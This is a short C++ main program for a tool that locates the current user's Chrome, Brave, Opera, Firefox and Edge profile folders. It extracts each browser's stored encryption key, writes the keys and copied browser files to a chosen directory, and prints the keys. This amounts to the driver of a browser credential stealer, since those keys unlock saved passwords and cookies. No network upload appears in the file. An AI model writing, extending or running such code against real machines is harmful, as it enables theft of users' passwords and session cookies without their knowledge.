#include <iostream>
#include "BrowserKeyExtract.h"
#include "utility.h"

#define NumberOfArgs	2


int main(int argc, char* argv[]) {

	if (argc != NumberOfArgs) {
		std::cerr << "Usage: " << extractFileNameFromPath(std::string(argv[0])) << " <path/to/output/directory>\n";
		return EXIT_FAILURE;
	}

	const std::string destinationPath (argv[1]);

	const std::string username { getusername() };
	std::vector<std::string> absolutePaths = makeAbsolutePaths(username, Browser::relativePaths);
	std::string chromePath = extractPathsForSpecificBrowser(absolutePaths, "Google");
	std::string operaPath = extractPathsForSpecificBrowser(absolutePaths, "Opera");
	std::string firefoxPath = extractPathsForSpecificBrowser(absolutePaths, "Firefox");
	std::string edgePath = extractPathsForSpecificBrowser(absolutePaths, "Edge");
	std::string bravePath = extractPathsForSpecificBrowser(absolutePaths, "Brave");
	
	Browser chrome, opera, edge, firefox, brave;

	chrome.ExtractKey(chromePath);
	chrome.WriteExtractedKeyToFile(destinationPath);
	chrome.ExtractFiles(chromePath, destinationPath);

	brave.ExtractKey(bravePath);
	brave.WriteExtractedKeyToFile(destinationPath);
	brave.ExtractFiles(bravePath, destinationPath);

	opera.ExtractKey(operaPath);
	opera.ExtractFiles(operaPath, destinationPath);
	opera.WriteExtractedKeyToFile(destinationPath);

	firefox.ExtractFiles(firefoxPath, destinationPath);

	edge.ExtractKey(edgePath);
	edge.ExtractFiles(edgePath, destinationPath);
	edge.WriteExtractedKeyToFile(destinationPath);

	chrome.ShowKey();
	brave.ShowKey();
	opera.ShowKey();
	edge.ShowKey();

	return 0;
}